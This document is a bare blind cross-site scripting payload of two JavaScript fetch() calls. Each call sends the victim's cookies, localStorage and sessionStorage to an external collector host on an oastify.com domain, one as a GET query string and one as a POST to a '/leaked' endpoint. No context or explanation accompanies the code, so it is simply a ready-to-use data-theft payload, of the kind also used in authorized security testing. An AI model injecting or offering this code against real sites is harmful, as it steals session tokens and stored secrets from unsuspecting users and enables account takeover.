fetch('https://bxss.ibxtzs1s2vviokfiodvpp8mcv31vplda.oastify.com/?cookie='+document.cookie+'&localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
fetch('https://bxss.ibxtzs1s2vviokfiodvpp8mcv31vplda.oastify.com/leaked', {method: "POST", body: 'cookie='+document.cookie+'&localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), headers: {"Content-type": "text/plain"}}).then(response => response.json()) .then(json => console.log(json)).catch(err => console.log(err));
